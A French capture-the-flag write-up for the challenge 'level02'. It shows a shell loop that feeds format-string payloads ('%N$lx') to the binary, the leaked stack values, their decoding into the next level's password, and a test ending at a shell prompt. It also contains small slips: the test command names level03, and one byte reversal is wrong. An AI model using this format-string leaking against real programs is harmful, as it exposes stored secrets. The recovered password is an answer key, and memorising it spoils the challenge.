# LEVEL 02

Le binaire level02 ne contiens qu'une fonction **main**.

Cette fonction appelle **open** de **"/home/users/level03/.pass"** suivi d'une comparaison menant à un **exit**, puis un **fread**.

Cela nous restreint dans notre utilisation de GDB, mais on sait que le **pass** est stocké quelque-part dans la **stack**.

Le programme lit 2 fois sur l'entrée standard via **fgets**.

La premiere string **login** est passée en premier argument à la fonction **printf**.

La deuxième string **passwd** est comparée au fichier **level03/.pass** et si la comparaison réussie le programme lance un **shell**.

On peut via le **script** ci dessous récupérer dans un fichier les valeurs stockées dans la **stack** de la fonction **main**:

<pre>
#!/bin/sh
IDX=0
while [ $IDX -lt 361 ]
do
echo $IDX >> /tmp/hexmap
(python -c "print '%$IDX\$lx ' + '\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  + '\n'") | ~/level02 | grep "access!" >> /tmp/hexmap
IDX=$((IDX+1))
echo $IDX
done
</pre>

En regardant le fichier créé on trouve un zone mémoire contenant 40 caractères suivie d'un \0:

<pre>
%0$lx  does not have access!
7fffffffe4f0  does not have access!
0  does not have access!
0  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
7fffffffe6e8  does not have access!
1f7ff9a08  does not have access!
...
100000000  does not have access!
0  does not have access!
756e505234376848  does not have access!
45414a3561733951  does not have access!
377a7143574e6758  does not have access!
354a35686e475873  does not have access!
48336750664b394d  does not have access!
0  does not have access!
20786c24383225  does not have access!
...
</pre>

On peut essayer de traduire cette string de 40 char.

On doit inverser la position de chaque valeur dans chaque zone mémoire pour passer de little endian à big endian.
Puis convertir les valeurs de l'hexa vers la **table ascii**:

<pre>


	little endian	 => big endian		 => str
1.	756e505234376848 => 4868373452506e75 => Hh74RPnu
2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE
3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7
4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5
5.	48336750664b394d => d4394b6650673348 => M9KfPg3H
0 => length 40


passwd => Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
</pre>

En le testant:
<pre>
./level03
"test"
"Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"
Greetings, test!
$>
</pre>